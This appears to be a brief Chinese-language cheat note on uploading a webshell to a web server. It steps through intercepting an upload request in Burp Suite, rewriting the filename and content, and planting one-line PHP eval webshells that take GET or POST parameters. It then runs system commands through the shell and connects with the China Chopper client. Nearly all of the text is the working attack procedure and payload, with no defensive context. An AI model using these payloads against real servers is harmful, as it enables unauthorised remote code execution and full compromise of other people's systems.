上传一个webshell到服务器

1、通过burpsuite代理抓包，将上传内容的包send to Repeater 
2、查看Request 修改上传文件名和内容
3、写入一句话  <?php eval($_GET['pass']);?>
4、?pass=system("ls");              执行代码 


5、写入一句话  <?php eval($_POST['pass']);?>
6、中国菜刀 shell
